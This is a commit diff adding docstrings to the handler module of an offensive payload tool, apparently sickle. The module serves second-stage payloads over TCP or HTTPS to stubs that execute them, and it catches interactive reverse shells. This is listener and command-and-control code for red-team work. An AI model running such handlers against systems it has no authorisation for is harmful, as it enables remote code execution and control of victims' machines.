1af11fd7fc40fcd9810d02747a48a429f1a3fa99
wetw0rk <mvalen1997@gmail.com>
2025-09-28 19:40:51 -0500

    Pushing documentation to handler module

--- src/sickle/modules/handler.py
+++ src/sickle/modules/handler.py
@@ -12,26 +12,31 @@ from sickle.common.lib.generic import modparser
 
 time_start = time.time()
 
-class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):
-
-    def do_GET(self):
-
-        if (self.server.uri_path in self.path):
-            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
-            self.wfile.write(struct.pack('<Q', len(self.server.stage)))
-            self.wfile.write(self.server.stage)
-
 class TCPStagerHandler(socketserver.StreamRequestHandler):
+    """This class is responsible for handling incoming TCP based connections.
+    Wherein there is an expectation that the client expects a second stage to
+    be sent. That said upon recieving a connection this handler will send a
+    second stage to the target
+    """
 
     def handle(self):
+        """Handles TCP connection
+        """
 
         log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
         self.request.send(struct.pack('<Q', len(self.server.stage)))
         self.request.send(self.server.stage)
 
 class SimpleTTYHandler(socketserver.StreamRequestHandler):
+    """This class is responsible for handling incoming TCP based reverse shells.
+    Consider this to operate in a similiar fashion to a standard netcat. As the
+    module gets updated it will be able to handle common mistakes made by users
+    such as hitting [CTRL] + [C].
+    """
 
     def handle(self):
+        """Handles the TCP session
+        """
 
         log_print(f"Connection established with {self.client_address[0]}\n")
 
@@ -53,6 +58,17 @@ class SimpleTTYHandler(socketserver.StreamRequestHandler):
             shell_prompt = response.decode('latin-1')
 
             self.request.sendall(input(shell_prompt).encode('latin-1') + b'\n')
+
+class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):
+
+    def do_GET(self):
+        """Handles GET requests made to the HTTPS server
+        """
+
+        if (self.server.uri_path in self.path):
+            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
+            self.wfile.write(struct.pack('<Q', len(self.server.stage)))
+            self.wfile.write(self.server.stage)
 
 class Module():
 
@@ -94,6 +110,10 @@ class Module():
     advanced["PATH"] = {}
     advanced["PATH"]["optional"] = "yes"
     advanced["PATH"]["description"] = "The path expected to be reached by our payload to send the second stage"
+
+    advanced["CERT"] = {}
+    advanced["CERT"]["optional"] = "yes"
+    advanced["CERT"]["description"] = "The path to a custom PEM file to use for SSL communication"
 
     def __init__(self, arg_object):
        
@@ -162,6 +182,14 @@ class Module():
         httpd.serve_forever()
 
     def start_tcp_handler(self):
+        """Starts a TCP Handler, allowing you to respond to a client using a
+        custom stager. This is useful when using staged stubs in which the
+        initial stub reaches out this this handler and executes the bytes we
+        send.
+
+        :return: Nothing
+        :rtype: None
+        """
 
         stage_server = socketserver.TCPServer((self.srvhost, self.srvport), TCPStagerHandler)
         log_print(f"TCPStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}")
@@ -169,14 +197,28 @@ class Module():
         stage_server.serve_forever()
 
     def start_tty_handler(self):
+        """Starts a TTY Handler, essentially allowing you to capture a reverse
+        shell and interact with it.
+
+        :return: Nothing
+        :rtype: None
+        """
 
         log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}")
         server = socketserver.TCPServer((self.srvhost, self.srvport), SimpleTTYHandler)
-        server.stage = self.stage
         server.serve_forever()
 
 def log_print(msg):
-        
+    """Prints a message with a timestamp prepended. This timestamp is based on
+    when the handler was started.
+
+    :param msg: The string to be printed alongside the timestamp
+    :type msg: str
+
+    :return: Prints message to stdout and returns nothing
+    :rtype: None
+    """
+
     elapsed = time.time() - time_start
     print(f"[{elapsed:12.6f}] {msg}")
     
